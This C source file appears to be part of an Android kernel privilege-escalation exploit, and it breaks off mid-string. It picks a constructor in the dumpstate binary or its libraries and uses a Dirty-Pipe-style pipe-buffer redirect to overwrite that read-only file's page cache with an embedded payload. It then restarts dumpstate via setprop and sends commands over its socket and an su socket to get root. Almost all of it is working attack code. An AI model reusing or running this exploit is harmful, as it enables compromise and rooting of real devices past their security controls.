#include "common.h"
#include "runtime_sha256.h"

#include <elf.h>
#include <limits.h>
#include <poll.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/system_properties.h>
#include <sys/un.h>
#include <sys/utsname.h>

extern const unsigned char pd2241_dumpstate_payload_start[];
extern const unsigned char pd2241_dumpstate_payload_end[];

enum {
  EP43074_PIPE_SLOT = 10,
  EP43074_CHILD_TIMEOUT = 180,
  EP43074_CHANNEL_TIMEOUT = 30,
};

struct ep43074_carrier {
  off_t patch_offset;
  off_t file_size;
  uint64_t init_array_va;
  uint64_t function_va;
  char path[PATH_MAX];
  char source[32];
  char needed[128];
  char sha256[65];
  dev_t device;
  ino_t inode;
  unsigned char preimage[32];
};

struct ep43074_needed {
  char name[128];
};

static struct ep43074_carrier selected_carrier;
static int selected_carrier_ready;

static uint64_t ep43074_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

static int ep43074_write_all(int fd, const void *data, size_t size) {
  const unsigned char *p = data;
  while (size) {
    ssize_t n = write(fd, p, size);
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) return 0;
    p += n;
    size -= (size_t)n;
  }
  return 1;
}

static int ep43074_pread_all(int fd, void *data, size_t size, off_t offset) {
  unsigned char *p = data;
  while (size) {
    ssize_t n = pread(fd, p, size, offset);
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) return 0;
    p += n;
    size -= (size_t)n;
    offset += n;
  }
  return 1;
}

static int ep43074_sha256_fd(int fd, char out[65]) {
  struct runtime_sha256 ctx;
  unsigned char digest[32];
  static const char digits[] = "0123456789abcdef";
  unsigned char buffer[16384];
  runtime_sha256_init(&ctx);
  if (lseek(fd, 0, SEEK_SET) < 0) return 0;
  for (;;) {
    ssize_t got = read(fd, buffer, sizeof(buffer));
    if (got < 0 && errno == EINTR) continue;
    if (got < 0) return 0;
    if (got == 0) break;
    runtime_sha256_update(&ctx, buffer, (size_t)got);
  }
  runtime_sha256_final(&ctx, digest);
  for (size_t i = 0; i < sizeof(digest); i++) {
    out[i * 2] = digits[digest[i] >> 4];
    out[i * 2 + 1] = digits[digest[i] & 15];
  }
  out[64] = 0;
  return 1;
}

static int ep43074_wait(pid_t pid, unsigned timeout_seconds) {
  uint64_t deadline = ep43074_ms() + (uint64_t)timeout_seconds * 1000ULL;
  int status = 0;
  for (;;) {
    pid_t got = waitpid(pid, &status, WNOHANG);
    if (got == pid) return WIFEXITED(status) ? WEXITSTATUS(status) : 128;
    if (got < 0 && errno != EINTR) return 127;
    if (ep43074_ms() >= deadline) {
      kill(pid, SIGKILL);
      while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {}
      return 124;
    }
    usleep(20000);
  }
}

static int ep43074_redirect(bool zero_mode, uint64_t target) {
  pid_t pid = fork();
  if (pid < 0) return 1;
  if (pid == 0) {
    int rc = zero_mode ? pd2241_late_refs_zero(target)
                       : pd2241_late_refs_pipe(target);
    fflush(stdout);
    _exit(rc);
  }
  int rc = ep43074_wait(pid, EP43074_CHILD_TIMEOUT);
  printf("TRACE route=%s stage=redirect mode=%s target=0x%016llx rc=%d\n",
         TARGET_ROUTE_REVISION, zero_mode ? "zero" : "pipe",
         (unsigned long long)target, rc);
  return rc;
}

static int ep43074_va_to_off(const Elf64_Phdr *phdr, size_t phnum,
                             uint64_t va, uint64_t size, uint64_t *off) {
  for (size_t i = 0; i < phnum; i++) {
    if (phdr[i].p_type != PT_LOAD) continue;
    if (va >= phdr[i].p_vaddr && size <= phdr[i].p_filesz &&
        va - phdr[i].p_vaddr <= phdr[i].p_filesz - size) {
      *off = phdr[i].p_offset + (va - phdr[i].p_vaddr);
      return 1;
    }
  }
  return 0;
}

static int ep43074_exec_va_to_off(const Elf64_Phdr *phdr, size_t phnum,
                                  uint64_t va, uint64_t size, uint64_t *off) {
  for (size_t i = 0; i < phnum; i++) {
    if (phdr[i].p_type != PT_LOAD || !(phdr[i].p_flags & PF_X)) continue;
    if (va >= phdr[i].p_vaddr && size <= phdr[i].p_filesz &&
        va - phdr[i].p_vaddr <= phdr[i].p_filesz - size) {
      *off = phdr[i].p_offset + (va - phdr[i].p_vaddr);
      return 1;
    }
  }
  return 0;
}

static uint64_t ep43074_rela_addend(const unsigned char *image, size_t size,
                                    const Elf64_Ehdr *eh, uint64_t slot_va) {
  if (!eh->e_shoff || !eh->e_shnum || eh->e_shentsize != sizeof(Elf64_Shdr) ||
      eh->e_shoff > size ||
      (uint64_t)eh->e_shnum * sizeof(Elf64_Shdr) > size - eh->e_shoff)
    return 0;
  const Elf64_Shdr *sh = (const Elf64_Shdr *)(image + eh->e_shoff);
  for (size_t i = 0; i < eh->e_shnum; i++) {
    if (sh[i].sh_type != SHT_RELA || sh[i].sh_entsize != sizeof(Elf64_Rela) ||
        sh[i].sh_offset > size || sh[i].sh_size > size - sh[i].sh_offset)
      continue;
    const Elf64_Rela *rela = (const Elf64_Rela *)(image + sh[i].sh_offset);
    size_t count = sh[i].sh_size / sizeof(*rela);
    for (size_t j = 0; j < count; j++)
      if (rela[j].r_offset == slot_va &&
          ELF64_R_TYPE(rela[j].r_info) == R_AARCH64_RELATIVE)
        return (uint64_t)rela[j].r_addend;
  }
  return 0;
}

static int ep43074_dynamic_arrays(const unsigned char *image, size_t size,
                                  const Elf64_Ehdr *eh,
                                  const Elf64_Phdr *phdr,
                                  uint64_t *array_va, uint64_t *array_size,
                                  uint64_t *rela_va, uint64_t *rela_size) {
  for (size_t i = 0; i < eh->e_phnum; i++) {
    if (phdr[i].p_type != PT_DYNAMIC || phdr[i].p_offset > size ||
        phdr[i].p_filesz > size - phdr[i].p_offset) continue;
    const Elf64_Dyn *dyn = (const Elf64_Dyn *)(image + phdr[i].p_offset);
    size_t count = phdr[i].p_filesz / sizeof(*dyn);
    for (size_t j = 0; j < count && dyn[j].d_tag != DT_NULL; j++) {
      if (dyn[j].d_tag == DT_INIT_ARRAY) *array_va = dyn[j].d_un.d_ptr;
      else if (dyn[j].d_tag == DT_INIT_ARRAYSZ) *array_size = dyn[j].d_un.d_val;
      else if (dyn[j].d_tag == DT_RELA) *rela_va = dyn[j].d_un.d_ptr;
      else if (dyn[j].d_tag == DT_RELASZ) *rela_size = dyn[j].d_un.d_val;
    }
    return *array_va && *array_size;
  }
  return 0;
}

static uint64_t ep43074_dynamic_addend(const unsigned char *image, size_t size,
                                       const Elf64_Phdr *phdr, size_t phnum,
                                       uint64_t rela_va, uint64_t rela_size,
                                       uint64_t slot_va) {
  uint64_t off = 0;
  if (!rela_va || !rela_size ||
      !ep43074_va_to_off(phdr, phnum, rela_va, rela_size, &off) ||
      off > size || rela_size > size - off) return 0;
  const Elf64_Rela *rela = (const Elf64_Rela *)(image + off);
  size_t count = rela_size / sizeof(*rela);
  for (size_t i = 0; i < count; i++)
    if (rela[i].r_offset == slot_va &&
        ELF64_R_TYPE(rela[i].r_info) == R_AARCH64_RELATIVE)
      return (uint64_t)rela[i].r_addend;
  return 0;
}

static int ep43074_inspect_carrier(const char *path, size_t payload_size,
                                   struct ep43074_carrier *out) {
  const char *reject_stage = "argument";
  int reject_errno = 0;
  size_t size = 0;
  memset(out, 0, sizeof(*out));
  if (!path || !path[0] || strlen(path) >= sizeof(out->path)) {
    printf("CARRIER_REJECT path=%s stage=%s errno=0\n",
           path ? path : "<null>", reject_stage);
    return 0;
  }
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    printf("CARRIER_REJECT path=%s stage=open errno=%d\n", path, errno);
    return 0;
  }
  struct stat st = {0};
  if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size <= 0 ||
      st.st_size > (64 << 20)) {
    reject_errno = errno;
    printf("CARRIER_REJECT path=%s stage=stat errno=%d mode=0%o size=%lld\n",
           path, reject_errno, (unsigned)st.st_mode,
           (long long)st.st_size);
    close(fd);
    return 0;
  }
  size = (size_t)st.st_size;
  if (!ep43074_sha256_fd(fd, out->sha256)) {
    printf("CARRIER_REJECT path=%s stage=sha256 errno=%d\n", path, errno);
    close(fd);
    return 0;
  }
  out->device = st.st_dev;
  out->inode = st.st_ino;
  unsigned char *image = malloc(size);
  if (!image || !ep43074_pread_all(fd, image, size, 0)) {
    reject_errno = errno;
    printf("CARRIER_REJECT path=%s stage=read errno=%d size=%zu\n",
           path, reject_errno, size);
    free(image);
    close(fd);
    return 0;
  }
  reject_stage = "elf_header";
  if (size < sizeof(Elf64_Ehdr)) goto fail;
  const Elf64_Ehdr *eh = (const Elf64_Ehdr *)image;
  if (memcmp(eh->e_ident, ELFMAG, SELFMAG) ||
      eh->e_ident[EI_CLASS] != ELFCLASS64 || eh->e_machine != EM_AARCH64 ||
      (eh->e_type != ET_DYN && eh->e_type != ET_EXEC) ||
      eh->e_phentsize != sizeof(Elf64_Phdr) || !eh->e_phnum ||
      eh->e_phoff > size ||
      (uint64_t)eh->e_phnum * sizeof(Elf64_Phdr) > size - eh->e_phoff)
    goto fail;
  const Elf64_Phdr *phdr = (const Elf64_Phdr *)(image + eh->e_phoff);
  uint64_t array_va = 0, array_size = 0, array_off = 0;
  uint64_t rela_va = 0, rela_size = 0;
  reject_stage = "init_array";
  if (!ep43074_dynamic_arrays(image, size, eh, phdr, &array_va, &array_size,
                              &rela_va, &rela_size) ||
      !ep43074_va_to_off(phdr, eh->e_phnum, array_va, array_size, &array_off))
    goto fail;
  if (array_off > size || array_size > size - array_off) goto fail;
  size_t count = array_size / sizeof(uint64_t);
  reject_stage = "constructor";
  for (size_t i = 0; i < count; i++) {
    uint64_t function_va = 0, function_off = 0;
    memcpy(&function_va, image + array_off + i * 8, 8);
    uint64_t slot_va = array_va + i * 8;
    if (!function_va) function_va = ep43074_rela_addend(image, size, eh, slot_va);
    if (!function_va)
      function_va = ep43074_dynamic_addend(image, size, phdr, eh->e_phnum,
                                           rela_va, rela_size, slot_va);
    if (!function_va ||
        !ep43074_exec_va_to_off(phdr, eh->e_phnum, function_va, payload_size,
                                &function_off) ||
        function_off < 1 || function_off > size || payload_size > size - function_off ||
        (function_off & (PAGE_SIZE - 1)) + payload_size > PAGE_SIZE)
      continue;
    uint32_t first = 0;
    memcpy(&first, image + function_off, sizeof(first));
    if (first == 0 || first == UINT32_MAX) continue;
    out->patch_offset = (off_t)function_off;
    out->file_size = st.st_size;
    out->init_array_va = slot_va;
    out->function_va = function_va;
    snprintf(out->path, sizeof(out->path), "%s", path);
    memcpy(out->preimage, image + function_off, sizeof(out->preimage));
    printf("CARRIER_SHA256 path=%s sha256=%s device=%llu inode=%llu\n",
           path, out->sha256, (unsigned long long)out->device,
           (unsigned long long)out->inode);
    printf("CARRIER_DYNAMIC path=%s size=0x%llx init_slot=0x%016llx "
           "function_va=0x%016llx patch=0x%llx page_off=0x%llx payload=%zu "
           "first_word=0x%08x\n", path,
           (unsigned long long)st.st_size, (unsigned long long)slot_va,
           (unsigned long long)function_va, (unsigned long long)function_off,
           (unsigned long long)(function_off & (PAGE_SIZE - 1)), payload_size,
           first);
    printf("CARRIER_PREIMAGE");
    for (size_t j = 0; j < sizeof(out->preimage); j++)
      printf(" %02x", out->preimage[j]);
    printf("\n");
    free(image);
    close(fd);
    return 1;
  }
fail:
  printf("CARRIER_REJECT path=%s stage=%s errno=%d size=%zu magic=%02x%02x%02x%02x\n",
         path, reject_stage, reject_errno, size,
         size > 0 ? image[0] : 0, size > 1 ? image[1] : 0,
         size > 2 ? image[2] : 0, size > 3 ? image[3] : 0);
  free(image);
  close(fd);
  return 0;
}

static int ep43074_read_needed(const char *path, struct ep43074_needed *needed,
                               size_t capacity, size_t *needed_count) {
  uint64_t needed_offsets[64] = {0};
  size_t offset_count = 0;
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  struct stat st = {0};
  unsigned char *image = NULL;
  int parsed = 0;
  if (needed_count) *needed_count = 0;
  if (fd < 0) {
    printf("DUMPSTATE_REJECT binary=%s stage=open errno=%d\n", path, errno);
    goto out;
  }
  if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) ||
      st.st_size <= 0 || st.st_size > (64 << 20) || !needed || !capacity ||
      !needed_count) {
    printf("DUMPSTATE_REJECT binary=%s stage=stat errno=%d mode=0%o size=%lld\n",
           path, errno, (unsigned)st.st_mode, (long long)st.st_size);
    goto out;
  }
  size_t size = (size_t)st.st_size;
  image = malloc(size);
  if (!image || !ep43074_pread_all(fd, image, size, 0)) {
    printf("DUMPSTATE_REJECT binary=%s stage=read errno=%d size=%zu\n",
           path, errno, size);
    goto out;
  }

  if (size < sizeof(Elf64_Ehdr)) {
    printf("DUMPSTATE_REJECT binary=%s stage=short size=%zu\n", path, size);
    goto out;
  }
  const Elf64_Ehdr *eh = (const Elf64_Ehdr *)image;
  if (memcmp(eh->e_ident, ELFMAG, SELFMAG) ||
      eh->e_ident[EI_CLASS] != ELFCLASS64 || eh->e_machine != EM_AARCH64 ||
      eh->e_phentsize != sizeof(Elf64_Phdr) || !eh->e_phnum ||
      eh->e_phoff > size ||
      (uint64_t)eh->e_phnum * sizeof(Elf64_Phdr) > size - eh->e_phoff)
  {
    printf("DUMPSTATE_REJECT binary=%s stage=elf class=%u machine=%u type=%u "
           "phnum=%u size=%zu magic=%02x%02x%02x%02x\n", path,
           eh->e_ident[EI_CLASS], eh->e_machine, eh->e_type, eh->e_phnum,
           size, image[0], image[1], image[2], image[3]);
    goto out;
  }
  const Elf64_Phdr *phdr = (const Elf64_Phdr *)(image + eh->e_phoff);
  uint64_t strtab_va = 0, strtab_size = 0, strtab_off = 0;
  for (size_t i = 0; i < eh->e_phnum; i++) {
    if (phdr[i].p_type != PT_DYNAMIC || phdr[i].p_offset > size ||
        phdr[i].p_filesz > size - phdr[i].p_offset)
      continue;
    const Elf64_Dyn *dyn = (const Elf64_Dyn *)(image + phdr[i].p_offset);
    size_t count = phdr[i].p_filesz / sizeof(*dyn);
    for (size_t j = 0; j < count && dyn[j].d_tag != DT_NULL; j++) {
      if (dyn[j].d_tag == DT_STRTAB) strtab_va = dyn[j].d_un.d_ptr;
      else if (dyn[j].d_tag == DT_STRSZ) strtab_size = dyn[j].d_un.d_val;
      else if (dyn[j].d_tag == DT_NEEDED &&
               offset_count < sizeof(needed_offsets) / sizeof(needed_offsets[0]))
        needed_offsets[offset_count++] = dyn[j].d_un.d_val;
    }
    break;
  }
  if (!strtab_va || !strtab_size ||
      !ep43074_va_to_off(phdr, eh->e_phnum, strtab_va, strtab_size,
                         &strtab_off) ||
      strtab_off > size || strtab_size > size - strtab_off)
  {
    printf("DUMPSTATE_REJECT binary=%s stage=dynamic strtab=0x%llx "
           "strsz=0x%llx needed_raw=%zu\n", path,
           (unsigned long long)strtab_va, (unsigned long long)strtab_size,
           offset_count);
    goto out;
  }

  for (size_t i = 0; i < offset_count && *needed_count < capacity; i++) {
    uint64_t name_off = needed_offsets[i];
    if (name_off >= strtab_size) continue;
    const char *name = (const char *)(image + strtab_off + name_off);
    size_t remaining = (size_t)(strtab_size - name_off);
    size_t length = strnlen(name, remaining);
    if (!length || length == remaining || length >= sizeof(needed[0].name))
      continue;
    snprintf(needed[*needed_count].name, sizeof(needed[*needed_count].name),
             "%s", name);
    printf("DUMPSTATE_NEEDED index=%zu name=%s\n", *needed_count,
           needed[*needed_count].name);
    (*needed_count)++;
  }
  parsed = 1;
out:
  free(image);
  if (fd >= 0) close(fd);
  return parsed;
}

static int ep43074_needed_rank(const char *name) {
  if (!name || strchr(name, '/') || strstr(name, "..")) return -1;
  if (!strcmp(name, "libdumpstateaidl.so")) return 0;
  if (!strcmp(name, "libdumpstateutil.so")) return 1;
  return -1;
}

static int ep43074_select_carrier(size_t payload_size,
                                  struct ep43074_carrier *out) {
  static const char *const roots[] = {
    "/system/lib64", "/system_ext/lib64", "/product/lib64"
  };
  struct ep43074_needed needed[64];
  size_t needed_count = 0;
  int needed_ok = ep43074_read_needed(TARGET_DUMPSTATE_BINARY, needed,
                                      sizeof(needed) / sizeof(needed[0]),
                                      &needed_count);
  printf("DUMPSTATE_DYNAMIC binary=%s parsed=%d needed=%zu\n",
         TARGET_DUMPSTATE_BINARY, needed_ok, needed_count);
  if (!needed_ok || needed_count == 0) {
    printf("CARRIER_REJECT path=%s stage=dt_needed_fail_closed\n",
           TARGET_DUMPSTATE_BINARY);
    return 0;
  }

  /* The executable is the narrowest carrier: both target services execute it,
   * while unrelated processes do not map a dumpstate-specific constructor. */
  if (ep43074_inspect_carrier(TARGET_DUMPSTATE_BINARY, payload_size, out)) {
    snprintf(out->source, sizeof(out->source), "%s", "executable");
    printf("CARRIER_SELECTED source=%s path=%s direct=1 needed=<self>\n",
           out->source, out->path);
    return 1;
  }

  for (int rank = 0; needed_ok && rank <= 1; rank++) {
    for (size_t i = 0; i < needed_count; i++) {
      if (ep43074_needed_rank(needed[i].name) != rank) continue;
      for (size_t j = 0; j < sizeof(roots) / sizeof(roots[0]); j++) {
        char path[PATH_MAX];
        int length = snprintf(path, sizeof(path), "%s/%s", roots[j],
                              needed[i].name);
        if (length <= 0 || (size_t)length >= sizeof(path) ||
            access(path, R_OK) != 0)
          continue;
        if (!ep43074_inspect_carrier(path, payload_size, out)) continue;
        snprintf(out->source, sizeof(out->source), "%s", "dt_needed");
        snprintf(out->needed, sizeof(out->needed), "%s", needed[i].name);
        printf("CARRIER_SELECTED source=%s path=%s direct=1 needed=%s rank=%d\n",
               out->source, out->path, out->needed, rank);
        return 1;
      }
    }
  }

  printf("CARRIER_REJECT path=%s stage=no_verified_constructor_carrier\n",
         TARGET_DUMPSTATE_BINARY);
  return 0;
}

static int ep43074_rc_file_has_service(const char *path, const char *service) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  struct stat st = {0};
  if (fstat(fd, &st) != 0 || st.st_size <= 0 || st.st_size > (1 << 20)) {
    close(fd);
    return 0;
  }
  size_t size = (size_t)st.st_size;
  char *text = malloc(size + 1);
  if (!text || !ep43074_pread_all(fd, text, size, 0)) {
    free(text);
    close(fd);
    return 0;
  }
  close(fd);
  text[size] = 0;
  char declaration[128];
  snprintf(declaration, sizeof(declaration), "service %s ", service);
  int found = strstr(text, declaration) && strstr(text, TARGET_DUMPSTATE_BINARY);
  printf("RC_SERVICE path=%s service=%s found=%d binary=%s\n", path, service,
         found, TARGET_DUMPSTATE_BINARY);
  free(text);
  return found;
}

static int ep43074_validate_rc_services(void) {
  static const char *const paths[] = {
      "/system/etc/init/dumpstate.rc",
      "/system/etc/init/bugreportd.rc",
      "/system_ext/etc/init/dumpstate.rc",
      "/vendor/etc/init/dumpstate.rc",
  };
  int dumpstate = 0;
  int bugreportd = 0;
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
    if (!dumpstate)
      dumpstate = ep43074_rc_file_has_service(paths[i],
                                               TARGET_DUMPSTATE_SERVICE);
    if (!bugreportd)
      bugreportd = ep43074_rc_file_has_service(paths[i],
                                                TARGET_BUGREPORTD_SERVICE);
  }
  printf("RC_SERVICE_GATE dumpstate=%d bugreportd=%d pass=%d\n", dumpstate,
         bugreportd, dumpstate && bugreportd);
  return dumpstate && bugreportd;
}

static int ep43074_revalidate_carrier(const struct ep43074_carrier *carrier) {
  int fd = open(carrier->path, O_RDONLY | O_CLOEXEC);
  struct stat st = {0};
  unsigned char preimage[sizeof(carrier->preimage)];
  char sha256[65] = {0};
  int ok = fd >= 0 && fstat(fd, &st) == 0 &&
           st.st_dev == carrier->device && st.st_ino == carrier->inode &&
           st.st_size == carrier->file_size &&
           ep43074_sha256_fd(fd, sha256) &&
           !strcmp(sha256, carrier->sha256) &&
           ep43074_pread_all(fd, preimage, sizeof(preimage),
                            carrier->patch_offset) &&
           !memcmp(preimage, carrier->preimage, sizeof(preimage));
  printf("CARRIER_REVALIDATE path=%s ok=%d sha256=%s expected=%s "
         "size=0x%llx expected_size=0x%llx\n",
         carrier->path, ok, sha256[0] ? sha256 : "<missing>",
         carrier->sha256, (unsigned long long)st.st_size,
         (unsigned long long)carrier->file_size);
  if (fd >= 0) close(fd);
  return ok;
}

int carrier_readonly_preflight(void) {
  const size_t payload_size =
      (size_t)(pd2241_dumpstate_payload_end - pd2241_dumpstate_payload_start);
  selected_carrier_ready = 0;
  memset(&selected_carrier, 0, sizeof(selected_carrier));
  if (payload_size < 64 || payload_size > 1024 ||
      !ep43074_validate_rc_services() ||
      !ep43074_select_carrier(payload_size, &selected_carrier) ||
      !ep43074_revalidate_carrier(&selected_carrier)) {
    printf("CARRIER_READONLY_GATE pass=0 payload=%zu\n", payload_size);
    return 0;
  }
  selected_carrier_ready = 1;
  printf("CARRIER_READONLY_GATE pass=1 path=%s patch=0x%llx sha256=%s\n",
         selected_carrier.path,
         (unsigned long long)selected_carrier.patch_offset,
         selected_carrier.sha256);
  return 1;
}

int carrier_runtime_preflight(int cfg_fd) {
  if ((!selected_carrier_ready && !carrier_readonly_preflight()) ||
      !ep43074_revalidate_carrier(&selected_carrier))
    return 0;
  int pfn_ready = physrw_carrier_pfn_prefetch(
      cfg_fd, selected_carrier.path, selected_carrier.patch_offset);
  printf("CARRIER_RUNTIME_GATE pass=%d cfg_fd=%d path=%s patch=0x%llx\n",
         pfn_ready, cfg_fd, selected_carrier.path,
         (unsigned long long)selected_carrier.patch_offset);
  return pfn_ready;
}

static int ep43074_log_service_state(const char *service) {
  char prop[PROP_NAME_MAX], value[PROP_VALUE_MAX] = {0};
  snprintf(prop, sizeof(prop), "init.svc.%s", service);
  int length = __system_property_get(prop, value);
  int stopped = length > 0 && !strcmp(value, "stopped");
  printf("SERVICE_PREFLIGHT name=%s state=%s stopped=%d\n", service,
         value[0] ? value : "<missing>", stopped);
  return stopped;
}

static int ep43074_seed_probe(char *path, size_t path_size) {
  snprintf(path, path_size, "/data/local/tmp/pd2241_43074_probe_%d", getpid());
  unlink(path);
  int fd = open(path, O_CREAT | O_EXCL | O_RDWR | O_CLOEXEC, 0600);
  if (fd < 0) return 0;
  unsigned char page[PAGE_SIZE];
  memset(page, 'A', sizeof(page));
  int ok = ep43074_write_all(fd, page, sizeof(page)) && fsync(fd) == 0;
  close(fd);
  if (!ok) unlink(path);
  return ok;
}

static int ep43074_read_enforcing(void) {
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  char c = 0;
  if (fd < 0) return -1;
  ssize_t n = read(fd, &c, 1);
  close(fd);
  return n == 1 && c == '1' ? 1 : n == 1 && c == '0' ? 0 : -1;
}

static int ep43074_trigger_service(const char *service, const char *verb) {
  pid_t pid = fork();
  if (pid < 0) return 1;
  if (pid == 0) {
    execl("/system/bin/setprop", "setprop", verb, service, (char *)NULL);
    _exit(127);
  }
  int rc = ep43074_wait(pid, 8);
  char prop[PROP_NAME_MAX], value[PROP_VALUE_MAX] = {0};
  snprintf(prop, sizeof(prop), "init.svc.%s", service);
  __system_property_get(prop, value);
  printf("SERVICE verb=%s name=%s rc=%d state=%s\n", verb, service, rc,
         value[0] ? value : "<missing>");
  return rc;
}

static int ep43074_connect(const char *path, unsigned timeout_seconds) {
  uint64_t deadline = ep43074_ms() + (uint64_t)timeout_seconds * 1000ULL;
  int last = ENOENT;
  while (ep43074_ms() < deadline) {
    int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (fd < 0) return -1;
    struct sockaddr_un sun;
    memset(&sun, 0, sizeof(sun));
    sun.sun_family = AF_UNIX;
    snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", path);
    if (connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0) return fd;
    last = errno;
    close(fd);
    usleep(100000);
  }
  errno = last;
  return -1;
}

static char *ep43074_read_all_socket(int fd) {
  size_t cap = 8192, used = 0;
  char *out = malloc(cap);
  if (!out) return NULL;
  for (;;) {
    if (cap - used < 4096) {
      cap *= 2;
      char *grown = realloc(out, cap);
      if (!grown) { free(out); return NULL; }
      out = grown;
    }
    struct pollfd pfd = {.fd = fd, .events = POLLIN | POLLHUP};
    int pr = poll(&pfd, 1, 30000);
    if (pr < 0 && errno == EINTR) continue;
    if (pr <= 0) break;
    ssize_t n = read(fd, out + used, cap - used - 1);
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) break;
    used += (size_t)n;
  }
  out[used] = 0;
  return out;
}

static char *ep43074_dumpstate_command(const char *command) {
  int fd = ep43074_connect(TARGET_DUMPSTATE_SOCKET, EP43074_CHANNEL_TIMEOUT);
  if (fd < 0) return NULL;
  const char suffix[] = "\nexit\n";
  if (!ep43074_write_all(fd, command, strlen(command)) ||
      !ep43074_write_all(fd, suffix, sizeof(suffix) - 1)) {
    close(fd);
    return NULL;
  }
  shutdown(fd, SHUT_WR);
  char *out = ep43074_read_all_socket(fd);
  close(fd);
  return out;
}

static char *ep43074_su_command(const char *command) {
  int fd = ep43074_connect(TARGET_SU_SOCKET, 20);
  if (fd < 0) return NULL;
  char mode = 'C';
  uint32_t len = (uint32_t)strlen(command);
  if (!ep43074_write_all(fd, &mode, 1) ||
      !ep43074_write_all(fd, &len, sizeof(len)) ||
      !ep43074_write_all(fd, command, len)) {
    close(fd);
    return NULL;
  }
  shutdown(fd, SHUT_WR);
  char *out = ep43074_read_all_socket(fd);
  close(fd);
  return out;
}

int pd2241_epoll43074_full(void) {
  static const unsigned char probe_payload[] = "PD2241_PIPE_OK!";
  size_t carrier_size = (size_t)(pd2241_dumpstate_payload_end -
                                 pd2241_dumpstate_payload_start);
  struct utsname uts;
  struct ep43074_carrier carrier;
  char probe_path[160] = {0};
  printf("TRACE route=%s stage=start target=%s kernel_sha256=%s "
         "kaslr_base=0x%016llx slide=0x%016llx\n", TARGET_ROUTE_REVISION,
         BUILD_VARIANT_LABEL, TARGET_KERNEL_SHA256,
         (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide);
  int uname_ok = uname(&uts) == 0;
  if (!uname_ok || strcmp(uts.release, TARGET_KERNEL_RELEASE) != 0 ||
      strcmp(uts.machine, "aarch64") != 0) {
    printf("RESULT FAIL identity expected=%s actual=%s machine=%s\n",
           TARGET_KERNEL_RELEASE, uname_ok ? uts.release : "<error>",
           uname_ok ? uts.machine : "<error>");
    return 1;
  }
  printf("IDENTITY uname=%s version=%s route=%s hash=%s\n",
         uts.release, uts.version, TARGET_ROUTE_REVISION, TARGET_KERNEL_SHA256);
  if (ep43074_read_enforcing() != 1) {
    printf("RESULT FAIL clean_selinux enforcing=%d\n", ep43074_read_enforcing());
    return 1;
  }
  if (carrier_size < 64 || carrier_size > 1024 ||
      !ep43074_select_carrier(carrier_size, &carrier)) {
    printf("RESULT FAIL carrier_select binary=%s payload=%zu\n",
           TARGET_DUMPSTATE_BINARY, carrier_size);
    return 1;
  }
  (void)ep43074_log_service_state(TARGET_DUMPSTATE_SERVICE);
  (void)ep43074_log_service_state(TARGET_BUGREPORTD_SERVICE);
  if (!prepare_embedded_su_carrier() ||
      !ep43074_seed_probe(probe_path, sizeof(probe_path))) {
    printf("RESULT FAIL preparation su=%s probe=%s errno=%d\n",
           TARGET_SU_CARRIER_PATH, probe_path, errno);
    return 1;
  }

  int probe_match = 0, carrier_match = 0;
  int attempts = env_int_range("EPOLL_PIPE_ATTEMPTS", 2, 1, 4);
  for (int attempt = 1; attempt <= attempts &&
                        !(probe_match && carrier_match); attempt++) {
    printf("TRACE route=%s stage=pipe_attempt attempt=%d/%d\n",
           TARGET_ROUTE_REVISION, attempt, attempts);
    uintptr_t pipe_page = prepare_pipe_buffer_page();
    pipe_page &= ~(uintptr_t)(ORDER3_SIZE - 1);
    pipe_page = (pipe_page & UINT64_C(0x00ffffffffffffff)) |
                UINT64_C(0xff00000000000000);
    if (!is_direct_ptr(pipe_page)) {
      printf("PIPE_ATTEMPT_FAIL stage=known_pipe_page value=0x%016zx\n",
             pipe_page);
      reset_pipe_attempt();
      continue;
    }
    /*
     * The preparation child mutates the inherited pipe file descriptions,
     * but its C globals are private after fork().  Publish the returned slab
     * address in the parent before the split Dirty-Pipe bridge validates it.
     */
    pipebuf_page_base = pipe_page;
    printf("PIPE_PAGE base=0x%016zx alignment=0x%zx rings=%d\n",
           pipe_page, (size_t)ORDER3_SIZE, PIPE_RECLAIM);
    if (!pipe_dirty_prepare_split(probe_path, 1, carrier.path,
                                  carrier.patch_offset, EP43074_PIPE_SLOT)) {
      printf("PIPE_ATTEMPT_FAIL stage=file_slots errno=%d\n", errno);
      reset_pipe_attempt();
      continue;
    }
    if (ep43074_redirect(false, pipe_page) != 0) {
      printf("PIPE_ATTEMPT_FAIL stage=late_refs\n");
      reset_pipe_attempt();
      continue;
    }
    (void)pipe_dirty_commit_split(probe_payload, sizeof(probe_payload) - 1,
                                  pd2241_dumpstate_payload_start, carrier_size,
                                  &probe_match, &carrier_match);
    printf("PIPE_PRIMITIVE attempt=%d bit4_observed=1 reversible_probe=%d "
           "carrier_write=%d\n", attempt, probe_match, carrier_match);
    reset_pipe_attempt();
  }
  unlink(probe_path);
  if (!probe_match || !carrier_match) {
    printf("RESULT FAIL pipe_bridge probe_match=%d carrier_match=%d\n",
           probe_match, carrier_match);
    return 1;
  }
  printf("RESULT PASS pipe_bridge probe_match=1 carrier_match=1 patch=0x%llx\n",
         (unsigned long long)carrier.patch_offset);

  (void)ep43074_trigger_service(TARGET_DUMPSTATE_SERVICE, "ctl.stop");
  if (ep43074_trigger_service(TARGET_DUMPSTATE_SERVICE, "ctl.start") != 0) {
    printf("RESULT FAIL dumpstate_trigger\n");
    return 1;
  }
  char *root = ep43074_dumpstate_command(
    "echo PD2241_ROOT_BEGIN; /system/bin/id; /system/bin/id -Z; "
